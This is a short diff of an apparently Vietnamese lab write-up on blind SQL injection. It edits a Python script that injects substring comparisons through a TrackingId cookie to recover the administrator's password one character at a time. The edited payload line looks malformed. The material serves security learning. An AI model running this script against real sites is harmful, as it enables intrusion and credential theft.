@@ -120,6 +120,8 @@ Theo như số thứ tự của payload 1 sẽ cho ra password:
 
 ![image](https://user-images.githubusercontent.com/115911041/232678012-ab200efa-8465-4749-b2cf-f941c9ecf68b.png)
 
+# Scrypt Python
+
 ```
 import requests
 import string
@@ -135,7 +137,7 @@ print("[+] Extract Info")
 
 for i in range(1, length+1):
     for char in characters:
-    	payload = "ofa7'UNION SELECT 'a' from users WHERE username = 'administrator' AND substring(password,%i,1)='%s'--" %(i, char)
+    	payload = "<TrackingId'SELECT 'a' from users WHERE username = 'administrator' AND substring(password,%i,1)='%s'--" %(i, char)
     	print("Trying Number %i with: " %(i), char)
     	cookie = {"TrackingId":payload}
     	response = requests.get(url, cookies=cookie)
